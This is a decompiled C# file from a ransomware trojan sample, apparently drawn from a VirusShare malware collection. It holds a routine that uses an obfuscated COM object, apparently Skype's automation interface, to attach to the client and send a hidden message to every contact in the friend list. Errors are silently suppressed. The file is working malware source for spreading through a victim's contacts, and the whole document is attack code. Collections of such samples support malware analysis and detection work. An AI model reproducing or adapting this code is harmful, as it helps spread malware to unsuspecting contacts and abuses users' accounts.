// Decompiled with JetBrains decompiler
// Type: DASkypeSPED
// Assembly: 222222, Version=7.75.26.79, Culture=neutral, PublicKeyToken=null
// MVID: 4BBEBC6C-8846-4FD8-8CBA-F3F42BFE498C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mxnf-86627272f15f9986eda96f2b9cf928cf060c453bafd8c484fce237fd3ff62a0a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.Runtime.CompilerServices;

public class DASkypeSPED
{
  public class SkypeSPEDll
  {
    public static void GTSKPE()
    {
      try
      {
        object objectValue1 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject(UYGQQYLC.WEGPJNXO("qbzV07pqlKuwg6m81dO6EA==", "False")));
        NewLateBinding.LateCall(NewLateBinding.LateGet(objectValue1, (Type) null, "Client", new object[0], (string[]) null, (Type[]) null, (bool[]) null), (Type) null, "Start", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
        NewLateBinding.LateCall(objectValue1, (Type) null, "Attach", new object[0], (string[]) null, (Type[]) null, (bool[]) null, true);
        try
        {
          foreach (object obj in (IEnumerable) NewLateBinding.LateGet(objectValue1, (Type) null, "Friends", new object[0], (string[]) null, (Type[]) null, (bool[]) null))
          {
            object objectValue2 = RuntimeHelpers.GetObjectValue(obj);
            object Instance1 = objectValue1;
            object[] objArray1 = new object[2];
            object[] objArray2 = objArray1;
            object Instance2 = objectValue2;
            object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Instance2, (Type) null, "Handle", new object[0], (string[]) null, (Type[]) null, (bool[]) null));
            objArray2[0] = objectValue3;
            objArray1[1] = (object) UGMVUKMJ.HVGGNPPD;
            object[] objArray3 = objArray1;
            object[] Arguments = objArray3;
            bool[] flagArray = new bool[2]{ true, true };
            bool[] CopyBack = flagArray;
            NewLateBinding.LateCall(Instance1, (Type) null, "SendMessage", Arguments, (string[]) null, (Type[]) null, CopyBack, true);
            if (flagArray[0])
              NewLateBinding.LateSetComplex(Instance2, (Type) null, "Handle", new object[1]
              {
                RuntimeHelpers.GetObjectValue(objArray3[0])
              }, (string[]) null, (Type[]) null, true, false);
            if (flagArray[1])
              UGMVUKMJ.HVGGNPPD = (string) Conversions.ChangeType(RuntimeHelpers.GetObjectValue(objArray3[1]), typeof (string));
          }
        }
        finally
        {
          IEnumerator enumerator;
          if (enumerator is IDisposable)
            (enumerator as IDisposable).Dispose();
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
